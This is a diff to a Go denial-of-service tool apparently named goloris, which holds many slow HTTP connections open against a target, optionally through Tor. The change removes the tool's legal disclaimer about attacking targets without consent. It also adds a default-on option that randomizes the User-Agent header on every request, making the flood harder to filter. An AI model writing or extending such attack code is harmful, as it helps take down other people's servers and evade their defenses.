@@ -18,12 +18,6 @@ import (
 const (
 	defaultUserAgent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)"
 	defaultDOSHeader = "Cookie: a=b"
-	legalDisclaimer  = `Usage of this program for attacking targets without prior mutual consent is
-illegal. It is the end user's responsibility to obey all applicable local,
-state and federal laws. Developers assume no liability and are not
-responsible for any misuse or damage caused by this program.
-This disclaimer was shamelessy copied from sqlmap with minor modifications :)
-    `
 )
 
 type options struct {
@@ -33,6 +27,7 @@ type options struct {
 	method         string
 	resource       string
 	userAgent      string
+	randomAgent    bool
 	target         string
 	https          bool
 	dosHeader      string
@@ -51,13 +46,14 @@ func (o *options) String() string {
 		"method:        %s\n"+
 		"resource:      %s\n"+
 		"user agent:    %s\n"+
+		"random agent:  %v\n"+
 		"target:        %s\n"+
 		"https:         %t\n"+
 		"DOS header:    %s\n"+
 		"finish after:  %s\n"+
 		"tor:           %v\n"+
 		"tor address:   %s\n\n", o.numConnections, o.interval, o.timeout, o.method,
-		o.resource, o.userAgent, o.target, o.https, o.dosHeader, o.finishAfter, o.tor, o.torAddress)
+		o.resource, o.userAgent, o.randomAgent, o.target, o.https, o.dosHeader, o.finishAfter, o.tor, o.torAddress)
 }
 
 func main() {
@@ -70,6 +66,7 @@ func main() {
 	flag.StringVar(&opts.method, "method", "GET", "HTTP method to use")
 	flag.StringVar(&opts.resource, "resource", "/", "Resource to request from the server")
 	flag.StringVar(&opts.userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
+	flag.BoolVar(&opts.randomAgent, "randomAgent", true, "Use a random user agent on each request")
 	flag.StringVar(&opts.dosHeader, "dosHeader", defaultDOSHeader, "Header to send repeatedly")
 	flag.BoolVar(&opts.https, "https", false, "Use HTTPS")
 	flag.BoolVar(&opts.timermode, "timermode", false, "Measure the timeout of the server. connections flag is omitted")
@@ -132,7 +129,7 @@ loop:
 
 func usage() {
 	fmt.Println("")
-	fmt.Println("usage: goloris [OPTIONS]... TARGET")
+	fmt.Printf("usage: %s [OPTIONS]... TARGET\n", os.Args[0])
 	fmt.Println("  TARGET host:port. port 80 is assumed for HTTP connections. 443 is assumed for HTTPS connections")
 	fmt.Println("")
 	fmt.Println("OPTIONS")
@@ -143,7 +140,6 @@ func usage() {
 	fmt.Printf("  %s -https -connections=500 192.168.0.1\n", os.Args[0])
 	fmt.Printf("  %s -useragent=\"some user-agent string\" -https -connections=500 192.168.0.1\n", os.Args[0])
 	fmt.Println("")
-	fmt.Println(legalDisclaimer)
 }
 
 func timer(opts options) {
@@ -261,9 +257,15 @@ func openConnection(opts options) (net.Conn, error) {
 
 func createHeader(opts options) *http.Header {
 	hdr := http.Header{}
-
 	hdr.Add("Host", opts.target)
-	hdr.Add("User-Agent", opts.userAgent)
+
+	var userAgent string
+	if opts.randomAgent {
+		userAgent = GenerateRandomUA()
+	} else {
+		userAgent = opts.userAgent
+	}
+	hdr.Add("User-Agent", userAgent)
 
 	return &hdr
 }
